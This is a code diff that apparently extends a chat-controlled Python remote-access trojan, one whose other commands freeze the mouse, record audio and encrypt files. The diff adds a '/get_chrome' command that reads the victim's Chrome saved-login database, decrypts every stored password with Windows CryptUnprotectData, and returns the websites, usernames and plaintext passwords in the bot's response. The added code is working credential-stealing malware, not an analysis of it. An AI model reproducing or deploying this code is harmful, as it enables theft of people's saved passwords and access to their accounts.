@@ -9,7 +9,9 @@ from tendo import singleton								# this makes the application exit if there's 
 from win32com.client import Dispatch					# WScript.Shell
 from time import strftime, sleep					
 import psutil											# updating	
-import win32clipboard                                   # Register clipboard    
+import win32clipboard                                   # register clipboard    
+import sqlite3											# get chrome passwords
+import win32crypt										# get chrome passwords
 import base64											# /encrypt_all
 import datetime											# /schedule
 import time
@@ -304,6 +306,20 @@ def handle(msg):
 					response += 'disabled. To enable, use /unfreeze_mouse'
 				else:
 					response += 'enabled'
+			elif command == '/get_chrome':
+				# """
+				__author__ = "Matan"
+				__version__ = "1.0.0"
+				__maintainer__ = "http://www.hackil.co.il"
+				con = sqlite3.connect(os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
+				cursor = con.cursor()
+				cursor.execute("SELECT origin_url,username_value,password_value from logins;")
+				for users in cursor.fetchall():
+					response += 'Website: ' + users[0] + '\n'
+					response += 'Username: ' + users[1] + '\n'
+					response += 'Password: ' + str(win32crypt.CryptUnprotectData(users[2], None, None, None, 0)) + '\n\n'
+				# """
+				# pass
 			elif command.startswith('/hear'):
 				SECONDS = -1
 				try:
